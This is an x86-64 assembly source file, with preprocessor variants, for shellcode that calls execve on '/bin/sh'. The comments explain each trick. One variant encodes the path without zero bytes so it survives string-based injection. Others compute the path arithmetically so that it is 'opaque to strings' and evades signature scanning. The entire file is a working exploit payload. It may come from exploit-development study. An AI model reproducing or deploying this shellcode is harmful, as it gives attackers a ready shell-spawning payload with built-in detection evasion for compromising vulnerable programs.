    .intel_syntax noprefix
    .text
    .balign 16
    .global exe
exe:
    xor    edx, edx       # execve arg2: empty env

#if EXE_INIT == 1
    # NB: stack grows downwards
    mov    rcx, 0x68732f6e69622f # "/bin/sh\0" reversed
    push   rcx
#elif EXE_INIT == 2
    # same but no zero byte
    mov    rcx, 0x68732f6e69622f69 # "i/bin/sh\0" reversed
    shr    rcx, 8
    push   rcx
#elif EXE_INIT == 3
    # same but opaque to strings
    # 0x68732f6e69622f == 171464413**2 + 205530982
    mov    eax, 171464413
    imul   rax, rax
    add    rax, 205530982
    push   rax
#else
    # similar, same size
    # 150409396 * 195466812 - 1 = 0x68732f6e69622f
    mov    eax, 195466812
    imul   rax, rax, 150409396
    dec    rax
    push   rax
#endif

    mov    rdi, rsp       # execve arg0: path

    push   rdx            # push sentinel to argv

#ifdef EXE_SH
    mov    rcx, rdi
    add    rcx, 5         # point to "sh"
    push   rcx            # push pointer to "sh" to argv
#else
    push   rdi            # just a pointer to "/bin/sh" has same effect
                          # and is shorter ...
#endif

#ifdef EXE_SYS
    mov    eax, 0x3b      # execve syscall nr,
#else
    xor    eax, eax       #     the same, byt shorter and no zero byte ...
    mov     al, 0x3b      # execve syscall nr
#endif

    mov    rsi, rsp       # execve arg1: argv
    syscall
